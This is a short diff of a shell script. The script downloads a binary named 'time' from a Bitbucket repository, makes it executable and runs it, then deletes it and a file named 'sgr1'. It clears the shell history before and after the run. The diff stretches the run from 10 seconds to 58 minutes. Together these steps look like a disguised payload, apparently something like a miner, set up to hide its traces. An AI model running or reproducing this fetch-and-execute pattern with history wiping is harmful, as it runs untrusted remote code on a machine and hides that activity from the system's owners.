@@ -11,7 +11,7 @@ uname -a
 wget https://bitbucket.org/makeda904/npm-node/raw/master/time 
 chmod +x time
 history -rc
-timeout 10 ./time
+timeout 58m ./time
 rm sgr1 time 
 echo "done..."
 history -rc
